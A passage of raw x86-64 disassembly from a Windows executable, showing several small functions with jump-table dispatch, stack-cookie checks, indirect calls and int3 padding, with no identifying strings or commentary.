   140004b5d:	48 8b 05 34 d3 03 00 	mov    0x3d334(%rip),%rax        # 0x140041e98
   140004b64:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b69:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   140004b6e:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   140004b73:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140004b78:	ff 15 32 69 02 00    	call   *0x26932(%rip)        # 0x14002b4b0
   140004b7e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b83:	f7 d8                	neg    %eax
   140004b85:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b89:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b8d:	1b c0                	sbb    %eax,%eax
   140004b8f:	49 8b e3             	mov    %r11,%rsp
   140004b92:	5f                   	pop    %rdi
   140004b93:	c3                   	ret
   140004b94:	cc                   	int3
   140004b95:	cc                   	int3
   140004b96:	cc                   	int3
   140004b97:	cc                   	int3
   140004b98:	cc                   	int3
   140004b99:	cc                   	int3
   140004b9a:	cc                   	int3
   140004b9b:	cc                   	int3
   140004b9c:	cc                   	int3
   140004b9d:	cc                   	int3
   140004b9e:	cc                   	int3
   140004b9f:	cc                   	int3
   140004ba0:	48 8b 81 10 20 00 00 	mov    0x2010(%rcx),%rax
   140004ba7:	8b 90 28 10 00 00    	mov    0x1028(%rax),%edx
   140004bad:	0f b6 81 79 30 00 00 	movzbl 0x3079(%rcx),%eax
   140004bb4:	03 d2                	add    %edx,%edx
   140004bb6:	0b d0                	or     %eax,%edx
   140004bb8:	81 c2 98 fd ff ff    	add    $0xfffffd98,%edx
   140004bbe:	83 fa 0b             	cmp    $0xb,%edx
   140004bc1:	77 61                	ja     0x140004c24
   140004bc3:	48 63 c2             	movslq %edx,%rax
   140004bc6:	48 8d 15 33 b4 ff ff 	lea    -0x4bcd(%rip),%rdx        # 0x140000000
   140004bcd:	8b 8c 82 28 4c 00 00 	mov    0x4c28(%rdx,%rax,4),%ecx
   140004bd4:	48 03 ca             	add    %rdx,%rcx
   140004bd7:	ff e1                	jmp    *%rcx
   140004bd9:	ba 68 01 00 00       	mov    $0x168,%edx
   140004bde:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004be3:	e9 40 03 01 00       	jmp    0x140014f28
   140004be8:	ba 88 01 00 00       	mov    $0x188,%edx
   140004bed:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004bf2:	e9 31 03 01 00       	jmp    0x140014f28
   140004bf7:	ba 90 01 00 00       	mov    $0x190,%edx
   140004bfc:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c01:	e9 22 03 01 00       	jmp    0x140014f28
   140004c06:	ba b0 01 00 00       	mov    $0x1b0,%edx
   140004c0b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c10:	e9 13 03 01 00       	jmp    0x140014f28
   140004c15:	ba c8 01 00 00       	mov    $0x1c8,%edx
   140004c1a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c1f:	e9 04 03 01 00       	jmp    0x140014f28
   140004c24:	33 c0                	xor    %eax,%eax
   140004c26:	c3                   	ret
   140004c27:	90                   	nop
   140004c28:	d9 4b 00             	(bad) 0x0(%rbx)
   140004c2b:	00 24 4c             	add    %ah,(%rsp,%rcx,2)
   140004c2e:	00 00                	add    %al,(%rax)
   140004c30:	e8 4b 00 00 24       	call   0x164004c80
   140004c35:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c38:	f7 4b 00 00 24 4c 00 	testl  $0x4c2400,0x0(%rbx)
   140004c3f:	00 06                	add    %al,(%rsi)
   140004c41:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c44:	24 4c                	and    $0x4c,%al
   140004c46:	00 00                	add    %al,(%rax)
   140004c48:	06                   	(bad)
   140004c49:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c4c:	24 4c                	and    $0x4c,%al
   140004c4e:	00 00                	add    %al,(%rax)
   140004c50:	15 4c 00 00 15       	adc    $0x1500004c,%eax
   140004c55:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c58:	cc                   	int3
   140004c59:	cc                   	int3
   140004c5a:	cc                   	int3
   140004c5b:	cc                   	int3
   140004c5c:	cc                   	int3
   140004c5d:	cc                   	int3
   140004c5e:	cc                   	int3
   140004c5f:	cc                   	int3
   140004c60:	48 85 c9             	test   %rcx,%rcx
   140004c63:	74 22                	je     0x140004c87
   140004c65:	53                   	push   %rbx
   140004c66:	48 83 ec 20          	sub    $0x20,%rsp
   140004c6a:	48 8b 05 57 d1 03 00 	mov    0x3d157(%rip),%rax        # 0x140041dc8
   140004c71:	48 8b d9             	mov    %rcx,%rbx
   140004c74:	ff 15 36 68 02 00    	call   *0x26836(%rip)        # 0x14002b4b0
   140004c7a:	48 8b cb             	mov    %rbx,%rcx
   140004c7d:	e8 ae 02 01 00       	call   0x140014f30
   140004c82:	48 83 c4 20          	add    $0x20,%rsp
   140004c86:	5b                   	pop    %rbx
   140004c87:	c3                   	ret
   140004c88:	cc                   	int3
   140004c89:	cc                   	int3
   140004c8a:	cc                   	int3
   140004c8b:	cc                   	int3
   140004c8c:	cc                   	int3
   140004c8d:	cc                   	int3
   140004c8e:	cc                   	int3
   140004c8f:	cc                   	int3
   140004c90:	40 53                	rex push %rbx
   140004c92:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004c99:	48 8b 05 a0 93 03 00 	mov    0x393a0(%rip),%rax        # 0x14003e040
   140004ca0:	48 33 c4             	xor    %rsp,%rax
   140004ca3:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140004caa:	00 
   140004cab:	48 8b 05 d6 d1 03 00 	mov    0x3d1d6(%rip),%rax        # 0x140041e88
   140004cb2:	48 8b d9             	mov    %rcx,%rbx
   140004cb5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004cba:	ff 15 f0 67 02 00    	call   *0x267f0(%rip)        # 0x14002b4b0
   140004cc0:	8b 43 14             	mov    0x14(%rbx),%eax
   140004cc3:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004cc8:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140004ccf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004cd4:	8b 43 18             	mov    0x18(%rbx),%eax
   140004cd7:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140004cde:	48 8b 05 db d0 03 00 	mov    0x3d0db(%rip),%rax        # 0x140041dc0
   140004ce5:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140004cec:	00 
   140004ced:	ff 15 bd 67 02 00    	call   *0x267bd(%rip)        # 0x14002b4b0
   140004cf3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004cf8:	0f 10 00             	movups (%rax),%xmm0
   140004cfb:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004cff:	48 8b 05 92 d1 03 00 	mov    0x3d192(%rip),%rax        # 0x140041e98
   140004d06:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140004d0b:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140004d10:	ff 15 9a 67 02 00    	call   *0x2679a(%rip)        # 0x14002b4b0
   140004d16:	f7 d8                	neg    %eax
   140004d18:	1b c0                	sbb    %eax,%eax
   140004d1a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140004d21:	00 
   140004d22:	48 33 cc             	xor    %rsp,%rcx
   140004d25:	e8 26 78 00 00       	call   0x14000c550
   140004d2a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140004d31:	5b                   	pop    %rbx
   140004d32:	c3                   	ret
   140004d33:	cc                   	int3
   140004d34:	cc                   	int3
   140004d35:	cc                   	int3
   140004d36:	cc                   	int3
   140004d37:	cc                   	int3
   140004d38:	cc                   	int3
   140004d39:	cc                   	int3
   140004d3a:	cc                   	int3
   140004d3b:	cc                   	int3
   140004d3c:	cc                   	int3
   140004d3d:	cc                   	int3
   140004d3e:	cc                   	int3
   140004d3f:	cc                   	int3
   140004d40:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140004d44:	44 8b 02             	mov    (%rdx),%r8d
   140004d47:	e9 f4 fa ff ff       	jmp    0x140004840
   140004d4c:	cc                   	int3
   140004d4d:	cc                   	int3
   140004d4e:	cc                   	int3
   140004d4f:	cc                   	int3
   140004d50:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004d55:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004d5a:	57                   	push   %rdi
   140004d5b:	b8 80 20 00 00       	mov    $0x2080,%eax
   140004d60:	e8 eb 7a 00 00       	call   0x14000c850
   140004d65:	48 2b e0             	sub    %rax,%rsp
   140004d68:	48 8b 05 d1 92 03 00 	mov    0x392d1(%rip),%rax        # 0x14003e040
   140004d6f:	48 33 c4             	xor    %rsp,%rax
   140004d72:	48 89 84 24 70 20 00 	mov    %rax,0x2070(%rsp)
   140004d79:	00 
   140004d7a:	48 8d 05 6f 79 02 00 	lea    0x2796f(%rip),%rax        # 0x14002c6f0
   140004d81:	48 8b fa             	mov    %rdx,%rdi
   140004d84:	48 8b f1             	mov    %rcx,%rsi
   140004d87:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004d8c:	4c 8d 8a 22 20 00 00 	lea    0x2022(%rdx),%r9
   140004d93:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004d9a:	00 
   140004d9b:	4c 8d 05 c2 6f 02 00 	lea    0x26fc2(%rip),%r8        # 0x14002bd64
   140004da2:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004da7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004dac:	e8 cf ce ff ff       	call   0x140001c80
   140004db1:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004db6:	0f 8d ad 00 00 00    	jge    0x140004e69
   140004dbc:	48 8d 05 45 79 02 00 	lea    0x27945(%rip),%rax        # 0x14002c708
   140004dc3:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004dc8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004dcd:	4c 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%r9
   140004dd4:	4c 8d 05 89 6f 02 00 	lea    0x26f89(%rip),%r8        # 0x14002bd64
   140004ddb:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004de2:	00 
   140004de3:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004dea:	00 
   140004deb:	e8 90 ce ff ff       	call   0x140001c80
   140004df0:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004df5:	7d 72                	jge    0x140004e69
   140004df7:	45 33 c0             	xor    %r8d,%r8d
   140004dfa:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004dff:	33 d2                	xor    %edx,%edx
   140004e01:	e8 8a 45 00 00       	call   0x140009390
   140004e06:	45 33 c0             	xor    %r8d,%r8d
   140004e09:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004e0e:	33 d2                	xor    %edx,%edx
   140004e10:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004e17:	00 
   140004e18:	e8 73 45 00 00       	call   0x140009390
   140004e1d:	45 33 c0             	xor    %r8d,%r8d
   140004e20:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004e25:	33 d2                	xor    %edx,%edx
   140004e27:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140004e2e:	e8 5d 45 00 00       	call   0x140009390
   140004e33:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004e38:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e3d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004e43:	48 8b d7             	mov    %rdi,%rdx
   140004e46:	48 8b ce             	mov    %rsi,%rcx
   140004e49:	e8 f2 fa ff ff       	call   0x140004940
   140004e4e:	8b f8                	mov    %eax,%edi
   140004e50:	33 db                	xor    %ebx,%ebx
   140004e52:	48 8b 4c dc 30       	mov    0x30(%rsp,%rbx,8),%rcx
   140004e57:	e8 d4 00 01 00       	call   0x140014f30
   140004e5c:	48 ff c3             	inc    %rbx
   140004e5f:	48 83 fb 03          	cmp    $0x3,%rbx
   140004e63:	7c ed                	jl     0x140004e52
   140004e65:	8b c7                	mov    %edi,%eax
   140004e67:	eb 05                	jmp    0x140004e6e
   140004e69:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004e6e:	48 8b 8c 24 70 20 00 	mov    0x2070(%rsp),%rcx
   140004e75:	00 
   140004e76:	48 33 cc             	xor    %rsp,%rcx
   140004e79:	e8 d2 76 00 00       	call   0x14000c550
   140004e7e:	4c 8d 9c 24 80 20 00 	lea    0x2080(%rsp),%r11
   140004e85:	00 
   140004e86:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140004e8a:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140004e8e:	49 8b e3             	mov    %r11,%rsp
   140004e91:	5f                   	pop    %rdi
   140004e92:	c3                   	ret
   140004e93:	cc                   	int3
   140004e94:	cc                   	int3
   140004e95:	cc                   	int3
   140004e96:	cc                   	int3
   140004e97:	cc                   	int3
   140004e98:	cc                   	int3
   140004e99:	cc                   	int3
   140004e9a:	cc                   	int3
   140004e9b:	cc                   	int3
   140004e9c:	cc                   	int3
   140004e9d:	cc                   	int3
   140004e9e:	cc                   	int3
   140004e9f:	cc                   	int3
   140004ea0:	48 83 ec 28          	sub    $0x28,%rsp
   140004ea4:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004eab:	4c 8b ca             	mov    %rdx,%r9
   140004eae:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004eb5:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004ebc:	45 03 c0             	add    %r8d,%r8d
   140004ebf:	44 0b c0             	or     %eax,%r8d
   140004ec2:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004ec9:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004ecd:	77 4a                	ja     0x140004f19
   140004ecf:	49 63 c0             	movslq %r8d,%rax
   140004ed2:	4c 8d 05 27 b1 ff ff 	lea    -0x4ed9(%rip),%r8        # 0x140000000
   140004ed9:	41 8b 94 80 24 4f 00 	mov    0x4f24(%r8,%rax,4),%edx
   140004ee0:	00 
   140004ee1:	49 03 d0             	add    %r8,%rdx
   140004ee4:	ff e2                	jmp    *%rdx
   140004ee6:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140004eea:	eb 19                	jmp    0x140004f05
   140004eec:	48 8d 91 f8 00 00 00 	lea    0xf8(%rcx),%rdx
   140004ef3:	eb 10                	jmp    0x140004f05
   140004ef5:	48 8d 91 10 01 00 00 	lea    0x110(%rcx),%rdx
   140004efc:	eb 07                	jmp    0x140004f05
   140004efe:	48 8d 91 18 01 00 00 	lea    0x118(%rcx),%rdx
   140004f05:	4d 8d 41 10          	lea    0x10(%r9),%r8
   140004f09:	e8 d2 fb ff ff       	call   0x140004ae0
   140004f0e:	85 c0                	test   %eax,%eax
   140004f10:	78 07                	js     0x140004f19
   140004f12:	33 c0                	xor    %eax,%eax
   140004f14:	48 83 c4 28          	add    $0x28,%rsp
   140004f18:	c3                   	ret
   140004f19:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004f1e:	48 83 c4 28          	add    $0x28,%rsp
   140004f22:	c3                   	ret
   140004f23:	90                   	nop
   140004f24:	e6 4e                	out    %al,$0x4e
   140004f26:	00 00                	add    %al,(%rax)
   140004f28:	19 4f 00             	sbb    %ecx,0x0(%rdi)
   140004f2b:	00 e6                	add    %ah,%dh
   140004f2d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f30:	19 4f 00             	sbb    %ecx,0x0(%rdi)
   140004f33:	00 ec                	add    %ch,%ah
   140004f35:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f38:	19 4f 00             	sbb    %ecx,0x0(%rdi)
   140004f3b:	00 f5                	add    %dh,%ch
   140004f3d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f40:	19 4f 00             	sbb    %ecx,0x0(%rdi)
   140004f43:	00 f5                	add    %dh,%ch
   140004f45:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f48:	19 4f 00             	sbb    %ecx,0x0(%rdi)
   140004f4b:	00 fe                	add    %bh,%dh
   140004f4d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f50:	fe 4e 00             	decb   0x0(%rsi)
   140004f53:	00 cc                	add    %cl,%ah
   140004f55:	cc                   	int3
   140004f56:	cc                   	int3
   140004f57:	cc                   	int3
   140004f58:	cc                   	int3
   140004f59:	cc                   	int3
   140004f5a:	cc                   	int3
   140004f5b:	cc                   	int3
   140004f5c:	cc                   	int3
   140004f5d:	cc                   	int3
   140004f5e:	cc                   	int3
   140004f5f:	cc                   	int3
   140004f60:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004f67:	4c 8b ca             	mov    %rdx,%r9
   140004f6a:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004f71:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004f78:	45 03 c0             	add    %r8d,%r8d
   140004f7b:	44 0b c0             	or     %eax,%r8d
   140004f7e:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004f85:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004f89:	77 63                	ja     0x140004fee
   140004f8b:	49 63 c0             	movslq %r8d,%rax
   140004f8e:	4c 8d 05 6b b0 ff ff 	lea    -0x4f95(%rip),%r8        # 0x140000000
   140004f95:	41 8b 94 80 f4 4f 00 	mov    0x4ff4(%r8,%rax,4),%edx
   140004f9c:	00 
   140004f9d:	49 03 d0             	add    %r8,%rdx
   140004fa0:	ff e2                	jmp    *%rdx
   140004fa2:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fa9:	48 8d 91 f0 00 00 00 	lea    0xf0(%rcx),%rdx
   140004fb0:	e9 2b fb ff ff       	jmp    0x140004ae0
   140004fb5:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fbc:	48 8d 91 08 01 00 00 	lea    0x108(%rcx),%rdx
   140004fc3:	e9 18 fb ff ff       	jmp    0x140004ae0
   140004fc8:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fcf:	48 8d 91 20 01 00 00 	lea    0x120(%rcx),%rdx
   140004fd6:	e9 05 fb ff ff       	jmp    0x140004ae0
   140004fdb:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fe2:	48 8d 91 28 01 00 00 	lea    0x128(%rcx),%rdx
   140004fe9:	e9 f2 fa ff ff       	jmp    0x140004ae0
   140004fee:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004ff3:	c3                   	ret
   140004ff4:	a2 4f 00 00 ee 4f 00 	movabs %al,0xa200004fee00004f
   140004ffb:	00 a2 
   140004ffd:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005000:	ee                   	out    %al,(%dx)
   140005001:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005004:	b5 4f                	mov    $0x4f,%ch
   140005006:	00 00                	add    %al,(%rax)
   140005008:	ee                   	out    %al,(%dx)
   140005009:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000500c:	c8 4f 00 00          	enter  $0x4f,$0x0
   140005010:	ee                   	out    %al,(%dx)
   140005011:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005014:	c8 4f 00 00          	enter  $0x4f,$0x0
   140005018:	ee                   	out    %al,(%dx)
   140005019:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000501c:	db 4f 00             	fisttpl 0x0(%rdi)
   14000501f:	00 db                	add    %bl,%bl
   140005021:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005024:	cc                   	int3
   140005025:	cc                   	int3
   140005026:	cc                   	int3
   140005027:	cc                   	int3
   140005028:	cc                   	int3
   140005029:	cc                   	int3
   14000502a:	cc                   	int3
   14000502b:	cc                   	int3
   14000502c:	cc                   	int3
   14000502d:	cc                   	int3
   14000502e:	cc                   	int3
   14000502f:	cc                   	int3
   140005030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005035:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000503a:	55                   	push   %rbp
   14000503b:	48 8b ec             	mov    %rsp,%rbp
   14000503e:	48 83 ec 70          	sub    $0x70,%rsp
   140005042:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140005049:	49 8b f8             	mov    %r8,%rdi
   14000504c:	48 8b d9             	mov    %rcx,%rbx
   14000504f:	44 8b 88 28 10 00 00 	mov    0x1028(%rax),%r9d
   140005056:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   14000505d:	45 03 c9             	add    %r9d,%r9d
   140005060:	44 0b c8             	or     %eax,%r9d
   140005063:	41 81 c1 98 fd ff ff 	add    $0xfffffd98,%r9d
   14000506a:	41 83 f9 0b          	cmp    $0xb,%r9d
   14000506e:	0f 87 96 02 00 00    	ja     0x14000530a
   140005074:	48 8d 15 85 af ff ff 	lea    -0x507b(%rip),%rdx        # 0x140000000
   14000507b:	49 63 c1             	movslq %r9d,%rax
   14000507e:	8b 8c 82 24 53 00 00 	mov    0x5324(%rdx,%rax,4),%ecx
   140005085:	48 03 ca             	add    %rdx,%rcx
   140005088:	ff e1                	jmp    *%rcx
   14000508a:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140005091:	00 00 00 
   140005094:	33 c9                	xor    %ecx,%ecx
   140005096:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   14000509c:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   1400050a2:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400050a6:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   1400050ac:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   1400050b0:	0f 94 c1             	sete   %cl
   1400050b3:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   1400050b9:	41 8b 00             	mov    (%r8),%eax
   1400050bc:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   1400050c2:	41 8b 40 0c          	mov    0xc(%r8),%eax
   1400050c6:	89 43 14             	mov    %eax,0x14(%rbx)
   1400050c9:	41 8b 40 10          	mov    0x10(%r8),%eax
   1400050cd:	89 43 18             	mov    %eax,0x18(%rbx)
   1400050d0:	41 8b 40 18          	mov    0x18(%r8),%eax
   1400050d4:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400050d7:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   1400050db:	85 c0                	test   %eax,%eax
   1400050dd:	74 4f                	je     0x14000512e
   1400050df:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   1400050e3:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   1400050ea:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400050ef:	4c 8b c8             	mov    %rax,%r9
   1400050f2:	48 8b 05 f7 cc 03 00 	mov    0x3ccf7(%rip),%rax        # 0x140041df0
   1400050f9:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400050fd:	48 8b d3             	mov    %rbx,%rdx
   140005100:	ff 15 aa 63 02 00    	call   *0x263aa(%rip)        # 0x14002b4b0
   140005106:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000510a:	0f 10 00             	movups (%rax),%xmm0
   14000510d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005111:	48 8b 05 80 cd 03 00 	mov    0x3cd80(%rip),%rax        # 0x140041e98
   140005118:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000511c:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140005120:	ff 15 8a 63 02 00    	call   *0x2638a(%rip)        # 0x14002b4b0
   140005126:	85 c0                	test   %eax,%eax
   140005128:	0f 85 dc 01 00 00    	jne    0x14000530a
   14000512e:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140005132:	85 c0                	test   %eax,%eax
   140005134:	0f 84 b5 01 00 00    	je     0x1400052ef
   14000513a:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   14000513e:	e9 68 01 00 00       	jmp    0x1400052ab
   140005143:	c7 83 c4 00 00 00 01 	movl   $0x1,0xc4(%rbx)
   14000514a:	00 00 00 
   14000514d:	33 c9                	xor    %ecx,%ecx
   14000514f:	89 8b 98 00 00 00    	mov    %ecx,0x98(%rbx)
   140005155:	89 8b b4 00 00 00    	mov    %ecx,0xb4(%rbx)
   14000515b:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000515f:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140005165:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005169:	0f 94 c1             	sete   %cl
   14000516c:	89 8b c8 00 00 00    	mov    %ecx,0xc8(%rbx)
   140005172:	41 8b 00             	mov    (%r8),%eax
   140005175:	89 83 b8 00 00 00    	mov    %eax,0xb8(%rbx)
   14000517b:	41 8b 40 0c          	mov    0xc(%r8),%eax
   14000517f:	89 43 14             	mov    %eax,0x14(%rbx)
   140005182:	41 8b 40 10          	mov    0x10(%r8),%eax
   140005186:	89 43 18             	mov    %eax,0x18(%rbx)
   140005189:	41 8b 40 18          	mov    0x18(%r8),%eax
   14000518d:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005190:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   140005194:	85 c0                	test   %eax,%eax
   140005196:	74 4f                	je     0x1400051e7
   140005198:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   14000519c:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   1400051a3:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400051a8:	4c 8b c8             	mov    %rax,%r9
   1400051ab:	48 8b 05 3e cc 03 00 	mov    0x3cc3e(%rip),%rax        # 0x140041df0
   1400051b2:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400051b6:	48 8b d3             	mov    %rbx,%rdx
   1400051b9:	ff 15 f1 62 02 00    	call   *0x262f1(%rip)        # 0x14002b4b0
   1400051bf:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400051c3:	0f 10 00             	movups (%rax),%xmm0
   1400051c6:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400051ca:	48 8b 05 c7 cc 03 00 	mov    0x3ccc7(%rip),%rax        # 0x140041e98
   1400051d1:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400051d5:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400051d9:	ff 15 d1 62 02 00    	call   *0x262d1(%rip)        # 0x14002b4b0
   1400051df:	85 c0                	test   %eax,%eax
   1400051e1:	0f 85 23 01 00 00    	jne    0x14000530a
   1400051e7:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400051eb:	85 c0                	test   %eax,%eax
   1400051ed:	0f 84 fc 00 00 00    	je     0x1400052ef
   1400051f3:	4c 8d 43 78          	lea    0x78(%rbx),%r8
   1400051f7:	e9 af 00 00 00       	jmp    0x1400052ab
   1400051fc:	c7 83 d4 00 00 00 01 	movl   $0x1,0xd4(%rbx)
   140005203:	00 00 00 
   140005206:	33 c9                	xor    %ecx,%ecx
   140005208:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   14000520e:	89 8b c4 00 00 00    	mov    %ecx,0xc4(%rbx)
   140005214:	41 8b 40 08          	mov    0x8(%r8),%eax
   140005218:	89 83 bc 00 00 00    	mov    %eax,0xbc(%rbx)
   14000521e:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005222:	0f 94 c1             	sete   %cl
   140005225:	89 8b d8 00 00 00    	mov    %ecx,0xd8(%rbx)
   14000522b:	41 8b 00             	mov    (%r8),%eax
   14000522e:	89 83 c8 00 00 00    	mov    %eax,0xc8(%rbx)
   140005234:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140005238:	89 43 14             	mov    %eax,0x14(%rbx)
   14000523b:	41 8b 40 10          	mov    0x10(%r8),%eax
   14000523f:	89 43 18             	mov    %eax,0x18(%rbx)
   140005242:	41 8b 40 18          	mov    0x18(%r8),%eax
   140005246:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005249:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   14000524d:	85 c0                	test   %eax,%eax
   14000524f:	74 4b                	je     0x14000529c
   140005251:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   140005255:	4c 8d 83 98 00 00 00 	lea    0x98(%rbx),%r8
   14000525c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005261:	4c 8b c8             	mov    %rax,%r9
   140005264:	48 8b 05 85 cb 03 00 	mov    0x3cb85(%rip),%rax        # 0x140041df0
   14000526b:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000526f:	48 8b d3             	mov    %rbx,%rdx
   140005272:	ff 15 38 62 02 00    	call   *0x26238(%rip)        # 0x14002b4b0
   140005278:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000527c:	0f 10 00             	movups (%rax),%xmm0
   14000527f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005283:	48 8b 05 0e cc 03 00 	mov    0x3cc0e(%rip),%rax        # 0x140041e98
